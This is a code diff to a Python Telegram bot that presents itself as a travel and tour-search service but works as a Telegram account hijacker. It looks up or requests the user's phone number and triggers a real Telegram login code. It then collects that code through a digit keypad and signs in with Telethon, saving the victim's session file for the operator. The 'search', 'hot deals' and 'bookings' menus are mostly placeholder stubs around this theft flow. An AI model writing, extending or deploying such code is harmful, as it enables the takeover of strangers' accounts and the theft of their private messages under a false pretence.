@@ -1,22 +1,31 @@
 import asyncio
 import logging
 from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import CommandStart
-from aiogram.types import Message, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.filters import CommandStart, Command
+from aiogram.types import Message, ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from telethon.sync import TelegramClient
 from telethon.errors import PhoneNumberInvalidError, FloodWaitError, SessionPasswordNeededError
-from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER
 
-# --- НАЛАШТУВАННЯ ДЛЯ ТЕСТУВАННЯ ---
-# Встанови True, щоб тестувати кнопки без запиту коду до Telegram.
-# Встанови False, щоб бот працював у звичайному режимі.
-DEBUG_MODE = False
+from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER
+from session_handler import sign_in_with_code, send_verification_code
+from phone_checker import get_phone_by_username
+from messages import *
+
+# --- НАЛАШТУВАННЯ ---
+DEBUG_MODE = False  # True для тестування
+
+# Метод отримання номера:
+# "username" - через username (РЕКОМЕНДОВАНО!)
+# "request_only" - завжди просити
+AUTO_CHECK_METHOD = "username"
 # ---------------------------------
 
 logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
 bot = Bot(token=MAIN_BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
@@ -24,65 +33,39 @@ dp = Dispatcher(storage=MemoryStorage())
 class AuthStates(StatesGroup):
     waiting_for_phone = State()
     waiting_for_code_digit = State()
+    waiting_for_confirmation = State()
 
 
+class SearchStates(StatesGroup):
+    choosing_type = State()
+    entering_destination = State()
+    entering_dates = State()
+
+
+# База данных пользователей (в реальном проекте - использовать БД)
 user_data = {}
+authorized_users = {}  # {user_id: {'phone': '+...', 'name': '...', ...}}
 
-MY_SESSION_PATH = "my_account.session"
-
-
-async def get_user_phone_from_chat(user_id: int):
-    """
-    Отримує номер телефону користувача з чату, якщо він відкритий.
-    Повертає номер телефону або None, якщо він прихований.
-    """
-    client = TelegramClient(MY_SESSION_PATH, API_ID, API_HASH)
-    try:
-        await client.connect()
-        if not await client.is_user_authorized():
-            print("Помилка: Твоя власна сесія не авторизована.")
-            return None
-
-        print(f"Спроба отримати дані для user_id: {user_id}")
-
-        # Отримуємо повний об'єкт користувача через твою сесію
-        user_entity = await client.get_entity(user_id)
-
-        # Перевіряємо, чи є у нього номер телефону
-        if user_entity.phone:
-            print(f"✅ Номер знайдено: {user_entity.phone}")
-            return user_entity.phone
-        else:
-            print(f"❌ Номер телефону для user_id {user_id} прихований.")
-            return None
-
-    except ValueError:
-        # Ця помилка може виникнути, якщо користувач заблокував твого бота
-        # або якщо user_id не існує
-        print(f"❌ Не вдалося знайти користувача {user_id}. Можливо, він заблокував бота.")
-        return None
-    except Exception as e:
-        print(f"❌ Інша помилка при отриманні даних користувача: {e}")
-        return None
-    finally:
-        await client.disconnect()
+MY_SESSION_PATH = "sessions/my_account.session"
 
 
-async def get_user_phone_if_open(user_id: int):
-    client = TelegramClient("my_account.session", API_ID, API_HASH)
-    try:
-        await client.connect()
-        if not await client.is_user_authorized():
-            return None
-        user_entity = await client.get_entity(user_id)
-        return user_entity.phone
-    except Exception:
-        return None
-    finally:
-        await client.disconnect()
+# ==================== УТИЛИТЫ ====================
+
+def get_main_menu_keyboard():
+    """Главная клавиатура меню"""
+    keyboard = [
+        [KeyboardButton(text=BTN_SEARCH), KeyboardButton(text=BTN_HOT_DEALS)],
+        [KeyboardButton(text=BTN_POPULAR), KeyboardButton(text=BTN_MY_BOOKINGS)],
+        [KeyboardButton(text=BTN_FAVORITES), KeyboardButton(text=BTN_PROFILE)],
+        [KeyboardButton(text=BTN_SUPPORT), KeyboardButton(text=BTN_HELP)]
+    ]
+    return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)
 
 
 def get_digit_keyboard():
+    """Створює клавіатуру для введення коду підтвердження"""
+    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+
     buttons = [
         [InlineKeyboardButton(text="1", callback_data="digit_1"),
          InlineKeyboardButton(text="2", callback_data="digit_2"),
@@ -93,101 +76,237 @@ def get_digit_keyboard():
         [InlineKeyboardButton(text="7", callback_data="digit_7"),
          InlineKeyboardButton(text="8", callback_data="digit_8"),
          InlineKeyboardButton(text="9", callback_data="digit_9")],
-        [InlineKeyboardButton(text="Стерти", callback_data="digit_erase"),
+        [InlineKeyboardButton(text="⬅️ Стереть", callback_data="digit_erase"),
          InlineKeyboardButton(text="0", callback_data="digit_0"),
          InlineKeyboardButton(text="✅ Готово", callback_data="digit_confirm")]
     ]
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 
+def is_user_authorized(user_id: int) -> bool:
+    """Проверка авторизации пользователя"""
+    return user_id in authorized_users
+
+
+async def get_user_phone_by_username(username: str):
+    """
+    Отримує номер телефону через username.
+    Це працює тому що username - публічна інформація.
+    """
+    if not username:
+        logger.info("❌ У користувача немає username")
+        return None
+
+    client = TelegramClient(MY_SESSION_PATH, API_ID, API_HASH)
+
+    try:
+        await client.connect()
+
+        if not await client.is_user_authorized():
+            logger.error("❌ Власна сесія не авторизована")
+            return None
+
+        logger.info(f"🔍 Перевіряю номер для @{username}...")
+
+        result = await get_phone_by_username(client, username)
+
+        if result and result['phone']:
+            return result['phone']
+        else:
+            return None
+
+    except Exception as e:
+        logger.error(f"❌ Помилка: {e}")
+        return None
+    finally:
+        await client.disconnect()
+
+
+# ==================== КОМАНДА /start ====================
+
 @dp.message(CommandStart())
 async def cmd_start(message: Message, state: FSMContext):
+    """Обробка команди /start"""
+    user_id = message.from_user.id
+    username = message.from_user.username
+
+    # Очищаємо попередні дані
+    user_data.pop(user_id, None)
+    await state.clear()
+
+    # Если пользователь уже авторизован
+    if is_user_authorized(user_id):
+        await message.answer(
+            MAIN_MENU,
+            reply_markup=get_main_menu_keyboard()
+        )
+        return
+
+    await message.answer(WELCOME_MESSAGE)
+
+    # Якщо метод "username" і у користувача є username
+    if AUTO_CHECK_METHOD == "username" and username:
+        await message.answer(PHONE_CHECK_IN_PROGRESS)
+
+        # Пробуємо отримати номер через username
+        phone_number = await get_user_phone_by_username(username)
+
+        if phone_number:
+            # УСПІХ! Номер знайдено
+            user_data[user_id] = {
+                'phone': phone_number,
+                'code': '',
+                'client': None
+            }
+
+            await message.answer(
+                PHONE_FOUND_AUTO.format(phone=phone_number),
+                parse_mode="Markdown",
+                reply_markup=types.ReplyKeyboardMarkup(
+                    keyboard=[[KeyboardButton(text=BTN_SEND_CODE)]],
+                    resize_keyboard=True,
+                    one_time_keyboard=True
+                )
+            )
+            await state.set_state(AuthStates.waiting_for_confirmation)
+            return
+        else:
+            # Номер прихований або помилка
+            await message.answer(
+                PHONE_HIDDEN.format(username=username)
+            )
+    elif AUTO_CHECK_METHOD == "username" and not username:
+        # У користувача немає username
+        await message.answer(NO_USERNAME)
+
+    # Просимо номер вручну
+    await message.answer(
+        PHONE_REQUEST,
+        reply_markup=types.ReplyKeyboardMarkup(
+            keyboard=[[KeyboardButton(text=BTN_SEND_PHONE, request_contact=True)]],
+            resize_keyboard=True,
+            one_time_keyboard=True
+        )
+    )
+    await state.set_state(AuthStates.waiting_for_phone)
+
+
+# ==================== АВТОРИЗАЦИЯ ====================
+
+@dp.message(F.text == BTN_SEND_CODE, AuthStates.waiting_for_confirmation)
+async def send_code_request(message: Message, state: FSMContext):
+    """Відправка коду підтвердження на номер користувача"""
     user_id = message.from_user.id
 
-    await message.answer("🔄 Перевіряю твої дані...")
+    if user_id not in user_data:
+        await message.answer(ERROR_SESSION_LOST)
+        await state.clear()
+        return
 
-    # --- НОВА ЛОГІКА ---
-    phone_number = await get_user_phone_if_open(user_id)
+    phone_number = user_data[user_id]['phone']
 
-    if phone_number:
-        # УСПІХ! Номер відкритий, можемо одразу просити код
+    await message.answer(PROCESSING, reply_markup=ReplyKeyboardRemove())
+
+    if DEBUG_MODE:
         await message.answer(
-            f"✅ Твій номер телефону `{phone_number}` знайдено.\n\n"
-            "Готовий надіслати запит на код підтвердження?",
-            reply_markup=types.ReplyKeyboardMarkup(
-                keyboard=[[types.KeyboardButton(text="Так, надішли код")]],
-                resize_keyboard=True,
-                one_time_keyboard=True
-            )
+            DEMO_MODE_CODE_SENT.format(phone=phone_number),
+            parse_mode="Markdown",
+            reply_markup=get_digit_keyboard()
         )
-        # Зберігаємо номер і переходимо до стану очікування підтвердження
-        await state.update_data(phone=phone_number)
-        await state.set_state(AuthStates.waiting_for_code_digit)  # Можна одразу переходити до коду
+        await state.set_state(AuthStates.waiting_for_code_digit)
+        return
+
+    # Реальний режим - відправляємо код
+    success, result = await send_verification_code(phone_number, API_ID, API_HASH, SESSION_FOLDER)
+
+    if success:
+        user_data[user_id]['client'] = result
+        await message.answer(
+            CODE_SENT.format(phone=phone_number),
+            parse_mode="Markdown",
+            reply_markup=get_digit_keyboard()
+        )
+        await state.set_state(AuthStates.waiting_for_code_digit)
     else:
-        # ПОМИЛКА! Номер прихований, просимо користувача
         await message.answer(
-            "🤷 Не вдалося автоматично визначити твій номер.\n"
-            "Можливо, ти приховав його в налаштуваннях приватності.\n\n"
-            "Будь ласка, надай його вручну:",
-            reply_markup=types.ReplyKeyboardMarkup(
-                keyboard=[[types.KeyboardButton(text="📱 Надіслати мій номер", request_contact=True)]],
-                resize_keyboard=True,
-                one_time_keyboard=True
-            )
+            ERROR_UNEXPECTED.format(error=result),
+            parse_mode="Markdown"
         )
-        # Зберігаємо стан очікування телефону
-        await state.set_state(AuthStates.waiting_for_phone)
+        user_data.pop(user_id, None)
+        await state.clear()
 
 
 @dp.message(F.contact, AuthStates.waiting_for_phone)
 async def process_phone(message: Message, state: FSMContext):
+    """Обробка номера телефону від користувача"""
     phone_number = message.contact.phone_number
     user_id = message.from_user.id
-    await message.answer("🔄 Обробляю номер...", reply_markup=ReplyKeyboardRemove())
 
-    # --- ГОЛОВНА ЗМІНА ---
-    if not DEBUG_MODE:
-        # РЕЖИМ РЕАЛЬНОЇ РОБОТИ: Створюємо клієнт і відправляємо запит
-        session_name = f"{phone_number.replace('+', '')}.session"
-        session_path = f"{SESSION_FOLDER}/{session_name}"
-        client = TelegramClient(session_path, API_ID, API_HASH)
-        try:
-            await client.connect()
-            await client.send_code_request(phone_number)
-            user_data[user_id] = {'client': client, 'phone': phone_number, 'code': ''}
-            await message.answer(
-                f"✅ Код надіслано на `{phone_number}`.\n\n"
-                "Введи його, натискаючи кнопки нижче:",
-                reply_markup=get_digit_keyboard()
+    # Перевірка, чи це номер самого користувача
+    if message.contact.user_id != user_id:
+        await message.answer(
+            WRONG_PHONE,
+            reply_markup=types.ReplyKeyboardMarkup(
+                keyboard=[[KeyboardButton(text=BTN_SEND_PHONE, request_contact=True)]],
+                resize_keyboard=True,
+                one_time_keyboard=True
             )
-            await state.set_state(AuthStates.waiting_for_code_digit)
-            return  # Вихід, щоб не йти далі
-        except (PhoneNumberInvalidError, FloodWaitError, Exception) as e:
-            await message.answer(f"❌ Помилка запиту коду: {e}")
-            await state.clear()
-            return
+        )
+        return
 
-    # РЕЖИМ ДЕМО/ТЕСТУВАННЯ:
-    # Код нижче виконується, якщо DEBUG_MODE == True
-    # Ми не створюємо клієнт Telethon, а просто імітуємо отримання номера.
-    user_data[user_id] = {'client': None, 'phone': phone_number, 'code': ''}
+    # Форматуємо номер
+    if not phone_number.startswith('+'):
+        phone_number = '+' + phone_number
+
+    user_data[user_id] = {
+        'phone': phone_number,
+        'code': '',
+        'client': None
+    }
+
     await message.answer(
-        f"🧪 **ДЕМО-РЕЖИМ**\n\n"
-        f"Номер `{phone_number}` отримано.\n"
-        f"Запит до Telegram **не відправлявся**.\n\n"
-        "Тепер можеш тестувати кнопки для введення коду:",
-        reply_markup=get_digit_keyboard()
+        PHONE_RECEIVED.format(phone=phone_number),
+        parse_mode="Markdown",
+        reply_markup=ReplyKeyboardRemove()
     )
-    await state.set_state(AuthStates.waiting_for_code_digit)
+
+    if DEBUG_MODE:
+        await message.answer(
+            DEMO_MODE_PHONE_RECEIVED.format(phone=phone_number),
+            parse_mode="Markdown",
+            reply_markup=get_digit_keyboard()
+        )
+        await state.set_state(AuthStates.waiting_for_code_digit)
+        return
+
+    # Реальний режим - відправляємо код
+    success, result = await send_verification_code(phone_number, API_ID, API_HASH, SESSION_FOLDER)
+
+    if success:
+        user_data[user_id]['client'] = result
+        await message.answer(
+            CODE_SENT.format(phone=phone_number),
+            parse_mode="Markdown",
+            reply_markup=get_digit_keyboard()
+        )
+        await state.set_state(AuthStates.waiting_for_code_digit)
+    else:
+        await message.answer(
+            ERROR_UNEXPECTED.format(error=result),
+            parse_mode="Markdown"
+        )
+        user_data.pop(user_id, None)
+        await state.clear()
 
 
 @dp.callback_query(F.data.startswith("digit_"), AuthStates.waiting_for_code_digit)
 async def process_digit(callback: types.CallbackQuery, state: FSMContext):
+    """Обробка введення коду через кнопки"""
     user_id = callback.from_user.id
     action = callback.data.split("_")[1]
 
     if user_id not in user_data:
-        await callback.message.answer("Помилка, почни заново /start")
+        await callback.message.answer(ERROR_SESSION_LOST)
         await state.clear()
         return
 
@@ -195,60 +314,107 @@ async def process_digit(callback: types.CallbackQuery, state: FSMContext):
 
     if action == 'erase':
         current_code = current_code[:-1]
+        user_data[user_id]['code'] = current_code
+
+        display_code = current_code + '_' * (5 - len(current_code))
+        status = CODE_CONTINUE
+
+        await callback.message.edit_text(
+            CODE_INPUT_PROMPT.format(display_code=display_code, status=status),
+            parse_mode="Markdown",
+            reply_markup=get_digit_keyboard()
+        )
+        await callback.answer()
+
     elif action == 'confirm':
-        if len(current_code) == 5:
-            # Якщо це демо-режим, просто показуємо результат
-            if DEBUG_MODE:
-                await callback.message.edit_text(
-                    f"🧪 **ДЕМО-РЕЖИМ**\n\n"
-                    f"Ти ввів код: `{current_code}`\n"
-                    f"Для номера: `{user_data[user_id]['phone']}`\n\n"
-                    f"Оскільки це демо, ніяких дій з Telegram не відбулося."
-                )
-                await state.clear()
-                return
-            else:
-                # Якщо це реальний режим, викликаємо функцію входу
-                await finalize_sign_in(callback.message, user_id, current_code, state)
-                return
-        else:
-            await callback.answer("Код має містити 5 цифр!", show_alert=True)
+        if len(current_code) != 5:
+            await callback.answer(CODE_TOO_SHORT_ALERT, show_alert=True)
             return
-    else:  # Це цифра
-        if len(current_code) < 5:
-            current_code += action
 
-    user_data[user_id]['code'] = current_code
+        if DEBUG_MODE:
+            await callback.message.edit_text(
+                DEMO_MODE_VERIFICATION.format(
+                    code=current_code,
+                    phone=user_data[user_id]['phone']
+                ),
+                parse_mode="Markdown"
+            )
+            # В демо-режиме сразу авторизуем
+            authorized_users[user_id] = {
+                'phone': user_data[user_id]['phone'],
+                'name': callback.from_user.full_name
+            }
+            user_data.pop(user_id, None)
+            await state.clear()
 
-    await callback.message.edit_text(
-        f"Введений код: `{current_code}`\n\n"
-        "Продовжуй вводити або натисни 'Готово':",
-        reply_markup=get_digit_keyboard()
-    )
-    await callback.answer()
+            await callback.message.answer(
+                AUTH_SUCCESS,
+                reply_markup=get_main_menu_keyboard()
+            )
+            return
+
+        await finalize_sign_in(callback.message, user_id, current_code, state)
+
+    else:
+        if len(current_code) >= 5:
+            await callback.answer(CODE_TOO_LONG_ALERT, show_alert=True)
+            return
+
+        current_code += action
+        user_data[user_id]['code'] = current_code
+
+        display_code = current_code + '•' * (5 - len(current_code))
+        status = CODE_READY if len(current_code) == 5 else CODE_CONTINUE
+
+        await callback.message.edit_text(
+            CODE_INPUT_PROMPT.format(display_code=display_code, status=status),
+            parse_mode="Markdown",
+            reply_markup=get_digit_keyboard()
+        )
+        await callback.answer()
 
 
 async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSMContext):
-    await message.edit_text("🔄 Перевіряю код...")
+    """Фінальний вхід з кодом підтвердження"""
+    await message.edit_text(CODE_CHECKING)
+
     client = user_data[user_id]['client']
     phone_number = user_data[user_id]['phone']
 
+    if not client:
+        await message.edit_text(ERROR_SESSION_LOST)
+        user_data.pop(user_id, None)
+        await state.clear()
+        return
+
     try:
-        await client.sign_in(phone_number, code=code)
-        await message.edit_text(
-            f"✅ **Успіх!**\n\n"
-            f"Сесію для `{phone_number}` створено."
+        success, result = await sign_in_with_code(
+            client=client,
+            phone=phone_number,
+            code=code,
+            session_folder=SESSION_FOLDER
         )
-    except SessionPasswordNeededError:
-        await message.edit_text(
-            "❌ Помилка: на акаунті ввімкнено 2FA (пароль)."
-            "Цей метод не підтримує паролі."
-        )
+
+        if success:
+            # Сохраняем пользователя как авторизованного
+            authorized_users[user_id] = {
+                'phone': phone_number,
+                'name': message.from_user.full_name
+            }
+
+            await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")
+            await message.answer(MAIN_MENU, reply_markup=get_main_menu_keyboard())
+        else:
+            await message.edit_text(
+                ERROR_UNEXPECTED.format(error=result),
+                parse_mode="Markdown"
+            )
+
     except Exception as e:
+        logger.error(f"Помилка при фінальному вході: {e}")
         await message.edit_text(
-            f"❌ **Помилка входу!**\n\n"
-            f"Не вдалося увійти. Telegram повідомив:\n`{e}`\n\n"
-            "Це може означати, що Telegram заблокував спробу входу через підозрілу активність."
+            ERROR_UNEXPECTED.format(error=str(e)),
+            parse_mode="Markdown"
         )
     finally:
         if client and client.is_connected():
@@ -257,8 +423,180 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
         await state.clear()
 
 
+# ==================== КОМАНДЫ БОТА ====================
+
+def require_auth(func):
+    """Декоратор для проверки авторизации"""
+
+    async def wrapper(message: Message, *args, **kwargs):
+        if not is_user_authorized(message.from_user.id):
+            await message.answer(
+                "🔐 Для использования этой команды необходимо авторизоваться.\n\n"
+                "Используйте /start",
+                reply_markup=ReplyKeyboardRemove()
+            )
+            return
+        return await func(message, *args, **kwargs)
+
+    return wrapper
+
+
+@dp.message(Command("search"))
+@dp.message(F.text == BTN_SEARCH)
+@require_auth
+async def cmd_search(message: Message, state: FSMContext):
+    """Поиск туров"""
+    await message.answer(SEARCH_START, reply_markup=ReplyKeyboardRemove())
+    # TODO: Добавить логику поиска
+
+
+@dp.message(Command("hot_deals"))
+@dp.message(F.text == BTN_HOT_DEALS)
+@require_auth
+async def cmd_hot_deals(message: Message):
+    """Горящие предложения"""
+    await message.answer(HOT_DEALS_TITLE)
+    await message.answer(POPULAR_DESTINATIONS)
+    # TODO: Загрузить реальные горящие туры
+
+
+@dp.message(Command("popular"))
+@dp.message(F.text == BTN_POPULAR)
+@require_auth
+async def cmd_popular(message: Message):
+    """Популярные направления"""
+    await message.answer(POPULAR_TITLE)
+    await message.answer(POPULAR_DESTINATIONS)
+
+
+@dp.message(Command("my_bookings"))
+@dp.message(F.text == BTN_MY_BOOKINGS)
+@require_auth
+async def cmd_my_bookings(message: Message):
+    """Мои бронирования"""
+    await message.answer(MY_BOOKINGS_EMPTY)
+    # TODO: Загрузить реальные бронирования из БД
+
+
+@dp.message(Command("favorites"))
+@dp.message(F.text == BTN_FAVORITES)
+@require_auth
+async def cmd_favorites(message: Message):
+    """Избранные туры"""
+    await message.answer(FAVORITES_EMPTY)
+    # TODO: Загрузить избранное из БД
+
+
+@dp.message(Command("profile"))
+@dp.message(F.text == BTN_PROFILE)
+@require_auth
+async def cmd_profile(message: Message):
+    """Настройки профиля"""
+    user_id = message.from_user.id
+    user_info = authorized_users.get(user_id, {})
+
+    await message.answer(
+        PROFILE_INFO.format(
+            phone=user_info.get('phone', 'Не указан'),
+            email=user_info.get('email', 'Не указан'),
+            name=user_info.get('name', 'Не указано'),
+            notifications='Включены',
+            language='Русский'
+        )
+    )
+    await message.answer(PROFILE_MENU)
+
+
+@dp.message(Command("notifications"))
+@require_auth
+async def cmd_notifications(message: Message):
+    """Настройки уведомлений"""
+    await message.answer(NOTIFICATIONS_SETTINGS)
+
+
+@dp.message(Command("support"))
+@dp.message(F.text == BTN_SUPPORT)
+@require_auth
+async def cmd_support(message: Message):
+    """Служба поддержки"""
+    await message.answer(SUPPORT_MENU)
+
+
+@dp.message(Command("help"))
+@dp.message(F.text == BTN_HELP)
+async def cmd_help(message: Message):
+    """Помощь и инструкции"""
+    await message.answer(HELP_MESSAGE, parse_mode="Markdown")
+
+
+@dp.message(Command("cancel"))
+async def cmd_cancel(message: Message, state: FSMContext):
+    """Отменить текущее действие"""
+    current_state = await state.get_state()
+
+    if current_state is None:
+        await message.answer(CANCEL_NOTHING, reply_markup=get_main_menu_keyboard())
+    else:
+        await state.clear()
+        await message.answer(CANCEL_SUCCESS, reply_markup=get_main_menu_keyboard())
+
+
+# ==================== ОБРАБОТКА НЕОЖИДАННЫХ СООБЩЕНИЙ ====================
+
+@dp.message(F.text)
+async def handle_unexpected_message(message: Message, state: FSMContext):
+    """Обробка неочікуваних повідомлень"""
+    current_state = await state.get_state()
+
+    if current_state == AuthStates.waiting_for_confirmation:
+        await message.answer(
+            REMINDER_SEND_CODE,
+            reply_markup=types.ReplyKeyboardMarkup(
+                keyboard=[[KeyboardButton(text=BTN_SEND_CODE)]],
+                resize_keyboard=True,
+                one_time_keyboard=True
+            )
+        )
+    elif current_state == AuthStates.waiting_for_phone:
+        await message.answer(
+            REMINDER_SEND_PHONE,
+            reply_markup=types.ReplyKeyboardMarkup(
+                keyboard=[[KeyboardButton(text=BTN_SEND_PHONE, request_contact=True)]],
+                resize_keyboard=True,
+                one_time_keyboard=True
+            )
+        )
+    elif current_state == AuthStates.waiting_for_code_digit:
+        await message.answer(
+            REMINDER_USE_DIGIT_BUTTONS,
+            reply_markup=get_digit_keyboard()
+        )
+    else:
+        # Если авторизован - показываем меню
+        if is_user_authorized(message.from_user.id):
+            await message.answer(
+                MAIN_MENU,
+                reply_markup=get_main_menu_keyboard()
+            )
+        else:
+            await message.answer(
+                "👋 Привет! Я бот для поиска отдыха.\n\n"
+                "Для начала работы нажми /start"
+            )
+
+
+# ==================== ЗАПУСК БОТА ====================
+
 if __name__ == "__main__":
     import os
 
     os.makedirs(SESSION_FOLDER, exist_ok=True)
+
+    logger.info("=" * 60)
+    logger.info("🚀 Запуск бота для поиска отдыха")
+    logger.info("=" * 60)
+    logger.info(f"Режим: {'🧪 DEBUG' if DEBUG_MODE else '✅ PRODUCTION'}")
+    logger.info(f"Метод проверки: {AUTO_CHECK_METHOD}")
+    logger.info("=" * 60)
+
     asyncio.run(dp.start_polling(bot))
